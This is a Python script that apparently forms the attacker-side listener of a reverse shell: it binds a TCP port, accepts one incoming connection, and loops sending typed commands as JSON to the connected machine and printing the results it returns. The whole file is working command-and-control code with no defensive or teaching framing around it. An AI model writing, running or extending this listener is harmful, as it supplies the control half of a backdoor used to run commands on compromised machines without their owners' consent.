#!usr/bin/env python3
import socket
import sys
import json

class Listener:
    def __init__(self, ip:str, port:int) -> None:    
        self.ip = ip 
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.ip,self.port))
        self.server.listen(0)
        print('[*] Server started and waiting for incoming connections.')

        self.connection, conn_addr = self.server.accept()
        print(f'[*] Incoming connection from {conn_addr}')


    def serial_send(self, data:str) :
        '''
        serialize data and send over TCP socket.
        '''
        json_data = json.dumps(data)
        bytes_json_data = bytes(json_data, encoding='utf-8')
        self.connection.send(bytes_json_data)


    def serial_receive(self) -> str :
        '''
        receive serialized data over TCP socket
        and retrieve original data.
        '''
        bytes_json_data = self.connection.recv(1024)
        return json.loads(bytes_json_data)


    def execute_remotely(self, command):
        self.serial_send(command)
        return self.serial_receive()


    def run(self):
        while True:
            try:
                command = input('>> ')
                execution_result = self.execute_remotely(command)
                print(execution_result)

            except KeyboardInterrupt:
                print('[!] ctrl+c detected. Closing and exiting server/listener')
                self.server.close()
                sys.exit()

            # except Exception as e:
            #     print('[-] Exception : ', e)